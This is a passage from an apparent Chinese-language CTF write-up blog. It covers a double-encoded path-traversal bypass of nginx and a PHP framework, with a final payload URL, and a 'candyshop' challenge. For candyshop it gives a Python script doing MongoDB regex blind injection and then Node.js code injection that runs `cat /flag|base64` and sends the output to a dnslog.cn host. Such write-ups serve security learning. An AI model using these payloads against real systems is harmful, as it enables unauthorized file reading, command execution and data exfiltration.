<p>十分可惜，这个isdanger是在engine启动前，根据nginx解析get变量后进行判断的，由于我们对<code>?</code>进行了编码绕过了nginx的变量解析，所以nginx传给php-fpm的<code>$_GET</code>是空的，自然能绕过isdanger。</p>
<p>又因为这个框架对url的解析只认最后一个斜杠，如果我们正常写<code>data=../../../flag</code>的话会被框架解析为<code>/flag</code>路由，如果写<code>data=..%2f..%2f..%2fflag</code>也没用，因为被nginx解码之后回去还是会变成<code>../</code>。    </p>
<p>继续追踪<code>net/Request.php</code>，这里多此一举的再次对url进行了解析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;url)) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;url = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Merge URL query parameters with $_GET</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$_GET</span> += <span class="built_in">self</span>::parseQuery(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;query-&gt;setData(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里，对<code>$this-&gt;url</code>再次进行了解析，之前骗过nginx的get请求此时被解析了出来，会把第二次解析的内容放入<code>$this-&gt;query-&gt;data</code>里，所以进到最后一步里，data就理所应当的被赋值进来了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$app</span>-&gt;render(<span class="string">&quot;admin&quot;</span>,[<span class="string">&quot;data&quot;</span>=&gt;<span class="string">&quot;./&quot;</span>.<span class="variable">$request</span>-&gt;query-&gt;data],<span class="string">&quot;body_content&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>至此，我们思路很清晰了，对<code>../</code>进行二次编码<code>..%252f</code>，第一次解码是在nginx层，解码为<code>..%2f</code>后传给php-fpm，这个不会被当成<code>/</code>，所以<code>$request-&gt;url</code>不变，第二次解码是在<code>request.php</code>中的<code>init</code>中，解完之后<code>$_GET[data]</code>就是<code>../</code>了，我们就能任意路径穿越去读文件了。</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://124.71.132.232:60080/..%2f/admin%3flogin=&amp;data=..%252f..%252f..%252f..%252fflag</span><br></pre></td></tr></table></figure>
<h2 id="candyshop"><a href="#candyshop" class="headerlink" title="candyshop"></a>candyshop</h2><p>审计源码发现是mongoDB,找到了一篇巨佬的博客<a href="https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/，里面有对于MongoDB的布尔盲注，盲注后拿到密码，登进去后发现order填写中并未进行任何过滤，所以考虑闭合右括号然后任意js代码执行，这里的执行没有回显，所以我们直接用dnslog进行数据外带即可。">https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/，里面有对于MongoDB的布尔盲注，盲注后拿到密码，登进去后发现order填写中并未进行任何过滤，所以考虑闭合右括号然后任意js代码执行，这里的执行没有回显，所以我们直接用dnslog进行数据外带即可。</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://123.60.21.23:23333&quot;</span></span><br><span class="line">strlist = string.ascii_lowercase + string.digits</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPass</span>():</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> strlist:</span><br><span class="line">            post_payload = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&#x27;^&#x27;</span> + password + c</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url+<span class="string">&#x27;/user/login&#x27;</span>, data=post_payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You Bad Bad&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] %s&quot;</span> % (password + c))</span><br><span class="line">                password += c</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(password) == <span class="number">64</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(password) == <span class="number">64</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    s.post(url + <span class="string">&#x27;/user/login&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;rabbit&#x27;</span>, <span class="string">&#x27;password&#x27;</span>:password&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    r = s.post(url + <span class="string">&#x27;/shop/order&#x27;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&quot;&#x27;)\n                                -[][\&quot;constructor\&quot;][\&quot;constructor\&quot;](\&quot;console.log(this.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;ping `cat /flag|base64`.lww0py.dnslog.cn&#x27;))\&quot;)()\n                                //&quot;</span>, <span class="string">&#x27;candyname&#x27;</span>:<span class="string">&#x27;bunny_candy&#x27;</span>, <span class="string">&#x27;address&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getPass()</span><br><span class="line">    login()</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
</search>
